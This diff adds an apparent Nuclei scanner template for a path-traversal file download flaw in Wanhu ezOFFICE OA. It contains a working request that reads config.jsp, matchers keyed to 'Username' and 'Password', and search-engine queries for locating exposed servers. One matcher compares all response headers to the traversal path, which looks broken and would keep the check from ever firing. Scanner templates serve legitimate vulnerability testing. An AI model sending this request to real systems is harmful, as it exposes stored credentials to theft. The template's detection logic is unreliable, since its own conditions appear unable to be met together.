@@ -1,0 +1,29 @@
+id: wanhu-ezoffice-downloadhttp-filedownload
+info:
+  name: 万户 ezoffice downloadhttp.jsp - filedownload
+  author: leadlife
+  severity: high
+  description: 万户 OA downloadhttp.jsp 任意文件下载漏洞
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20downloadhttp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,filedownload,oa,ezoffice
+
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Username','Password')
+          - all_headers == '../public/edit/jsp/config.jsp'
+        condition: and
